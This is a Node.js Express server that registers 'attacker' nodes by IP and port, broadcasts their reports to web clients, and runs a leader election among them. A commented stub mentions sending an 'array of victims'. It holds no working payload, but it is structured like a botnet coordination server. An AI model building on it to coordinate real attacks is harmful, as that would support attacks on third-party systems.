// require necessary dependencies for http transactions
var express = require("express");
var app = express();
var request = require("request");
var http = require('http').Server(app);
var io = require("socket.io")(http);
var bodyParser = require('body-parser');

app.use(express.static(__dirname + '/www')); // path used for the webpage
app.use('/node_modules', express.static(__dirname + '/node_modules')); // path used to reference node modules in html

app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

var connectedAttackers = 0;
var leader = "";

// Callback function when a HTTP POST method is requested, in the path '/iot-device'
// Converts iot-device received data to a format understood by the web client
app.put("/attacker", function(req, res) {
	console.log("Receiving attacker data...");
	console.log(req.body);

	var id = req.body.id;
	
	// socket broadcast message to all the connected clients
	// with the received device data
	io.emit("device data", {
		"ID": id,
		"datetime": req.body.datetime,
		"data": req.body.data
	});

	//updateAttackerIPAndPort(req.body.id, ip, port);
	// set device message sending time to default, if it's a new device
	//updateAttackerTime(req.body.id);
	//console.log(req);

	res.send(attackersData);
	// response sent to device with the time to send a message in milliseconds
	//res.send(attackersData);

	/*request.post({
	  headers: {"content-type" : "application/json"},
	  url:     "http://" + attackersData[id].ip + ":" + attackersData[id].port + "/attackers",
	  body:    JSON.stringify(attackersData)
	}, function(error, res, body){
	  console.log(error);
	});*/

	//console.log(attackersData[id].ip + ":" + attackersData[id].port + "/attackers");
});

app.post("/attacker", function(req, res) {
	console.log("Receiving attacker port...");
	console.log(req.body);

	var id = req.body.id;
	var ip = /.*:(([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}))/g.exec(req.connection.remoteAddress)[1];
	var port = req.body.port

	updateAttackerIPAndPort(id, ip, port);
	// set device message sending time to default, if it's a new device
	//updateAttackerTime(id);
	res.send(attackersData);
	connectedAttackers++;
	if (connectedAttackers === 3) {
		setTimeout(startElection, 4000);
	}
	
	/*request.post({
	  headers: {"content-type" : "application/json"},
	  url:     "http://" + attackersData[id].ip + ":" + attackersData[id].port + "/attackers",
	  body:    JSON.stringify(attackersData)
	}, function(error, res, body){
	  console.log(error);
	});*/

	console.log(attackersData);
});

app.post("/leader", function(req, res) {
	if (leader === "") {
		leader = req.body.leader;
		console.log("The leader is: " + leader);
		//Send array of victims
		//res.send(ARRAY);
	} else {
		res.send("LEADER");
	}
});

// Callback function when a 'connection' socket message is received
// When a client connection is established
io.on('connection', function(socket){
  console.log('Web client connection established');
  
  // Callback function when a 'update time' socket message is received
  // Updates a given device with a given time
  /*socket.on('update time', function(deviceTime) {
	updateAttackerTime(deviceTime.ID, deviceTime.time);
  });*/
});

var attackersData = {}; // JSON containing the data of the attackers, time, ip address and port

// Updates the time of a given device
/*function updateAttackerTime(id, time) {
	if (time) { // time is passed as a parameter
		attackersData[id].time = time;
	} else if (!attackersData[id].time) { // time isn't passed as a parameter
		attackersData[id].time = 1000; // set device time to default (1000 milliseconds)
	}
}*/

function startElection() {
	leader = "";
	for (var key in attackersData) {
		request.post({
		  headers: {"content-type" : "text/plain"},
		  url:     "http://" + attackersData[key].ip + ":" + attackersData[key].port + "/election",
		  body:    ""
		}, function(error, res, body){
		  console.log(error);
		});
	}
}

function updateAttackerIPAndPort(id, ip, port) {
	if (!attackersData[id]) {
		attackersData[id] = {};
	}
	attackersData[id].ip = ip;
	attackersData[id].port = port;
}

//Starts the server, it listens on port 8080
var serverPort = 8080;
http.listen(serverPort);
console.log("Server running on: " + serverPort);